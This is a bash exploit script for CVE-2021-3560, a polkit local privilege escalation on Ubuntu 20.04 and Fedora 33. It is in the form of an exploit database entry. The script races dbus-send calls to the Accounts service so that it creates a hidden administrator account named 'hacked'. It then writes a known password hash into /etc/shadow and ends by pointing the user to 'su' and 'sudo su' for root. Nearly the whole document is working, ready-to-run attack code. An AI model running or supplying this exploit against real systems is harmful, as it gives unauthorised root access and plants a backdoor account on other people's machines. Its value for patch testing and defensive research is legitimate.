# Exploit Title: Polkit 0.105-26 0.117-2 - Local Privilege Escalation
# Date: 06/11/2021
# Exploit Author: J Smith (CadmusofThebes)
# Vendor Homepage: https://www.freedesktop.org/
# Software Link: https://www.freedesktop.org/software/polkit/docs/latest/polkitd.8.html
# Version: polkit 0.105-26 (Ubuntu), polkit 0.117-2 (Fedora)
# Tested on: Ubuntu 20.04, Fedora 33
# CVE: CVE-2021-3560
# Source: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/

#!/bin/bash

# Set the name and display name
userName="hacked"
realName="hacked"

# Set the account as an administrator
accountType=1

# Set the password hash for 'password' and password hint
password='$5$WR3c6uwMGQZ/JEZw$OlBVzagNJswkWrKRSuoh/VCrZv183QpZL7sAeskcoTB'
passHint="password"

# Check Polkit version
polkitVersion=$(systemctl status polkit.service | grep version | cut -d " " -f 9)
if [[ "$(apt list --installed 2>/dev/null | grep polkit | grep -c 0.105-26)" -ge 1 || "$(yum list installed | grep polkit | grep -c 0.117-2)" ]]; then
    echo "[*] Vulnerable version of polkit found"
else
    echo "[!] WARNING: Version of polkit might not vulnerable"
fi

# Validate user is running in SSH instead of desktop terminal
if [[ -z $SSH_CLIENT || -z $SSH_TTY ]]; then
    echo "[!] WARNING: SSH into localhost first before running this script in order to avoid authentication prompts"
    exit
fi

# Test the dbus-send timing to load into exploit
echo "[*] Determining dbus-send timing"
realTime=$( TIMEFORMAT="%R"; { time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType ; } 2>&1 | cut -d " " -f6 )
halfTime=$(echo "scale=3;$realTime/2" | bc)

# Check for user first in case previous run of script failed on password set
if id "$userName" &>/dev/null; then
    userid=$(id -u $userName)
    echo "[*] New user $userName already exists with uid of $userid"
else
    userid=""
	echo "[*] Attempting to create account"
    while [[ $userid == "" ]]
    do
        dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2>/dev/null & sleep $halfTime ; kill $! 2>/dev/null
        if id "$userName" &>/dev/null; then
	    userid=$(id -u $userName)
            echo "[*] New user $userName created with uid of $userid"
        fi
    done
fi

# Add the password to /etc/shadow
# Sleep added to ensure there is enough of a delay between timestamp checks
echo "[*] Adding password to /etc/shadow and enabling user"
sleep 1
currentTimestamp=$(stat -c %Z /etc/shadow)
fileChanged="n"
while [ $fileChanged == "n" ]
do
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2>/dev/null & sleep $halfTime ; kill $! 2>/dev/null
	if [ $(stat -c %Z /etc/shadow) -ne $currentTimestamp ];then
	    fileChanged="y"
	    echo "[*] Exploit complete!"
	fi
done

echo ""
echo "[*] Run 'su - $userName', followed by 'sudo su' to gain root access"